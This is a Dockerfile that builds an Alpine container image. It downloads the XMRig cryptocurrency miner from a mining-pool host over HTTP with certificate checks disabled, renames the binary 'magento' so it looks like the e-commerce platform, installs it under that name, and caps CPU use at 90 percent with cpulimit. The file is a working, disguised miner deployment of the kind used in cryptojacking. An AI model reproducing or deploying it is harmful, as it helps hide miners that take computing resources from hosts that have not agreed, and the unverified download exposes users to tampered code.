FROM alpine:3.12

LABEL maintainer="salem <lusalem@gmail.com>"

ENV CPULIMIT_VERSION=0.2
ENV CPU_USAGE=90
    
RUN apk add --no-cache build-base \
    &&  cd /root \
    &&  wget --no-check-certificate -c https://github.com/opsengine/cpulimit/archive/v${CPULIMIT_VERSION}.tar.gz \
    &&  tar zxvf v${CPULIMIT_VERSION}.tar.gz \
    &&  cd cpulimit-${CPULIMIT_VERSION} \
    &&  sed -i "/#include <sys\/sysctl.h>/d" src/cpulimit.c  \
    &&  make \
    &&  cp src/cpulimit /usr/bin/ \
    &&  cd /root \
    &&  wget --no-check-certificate -c http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz \
    &&  tar zxvf xmrig.tar.gz \
    &&  mv xmrig magento \
    &&  chmod 775 magento \
    &&  chmod 775 config.json \
    &&  cp magento /usr/bin/ \
    &&  mkdir -p /etc/magento \
    &&  cp config.json /etc/magento \
    &&  apk del build-base \
    &&  cd /root \
    &&  rm v${CPULIMIT_VERSION}.tar.gz \
    &&  rm -rf cpulimit-${CPULIMIT_VERSION} \
    &&  rm -rf /tmp/* /var/cache/apk/*

COPY docker-entrypoint.sh /usr/local/bin/
RUN chmod 775 usr/local/bin/docker-entrypoint.sh  \
    &&  ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat

ENTRYPOINT ["docker-entrypoint.sh"]
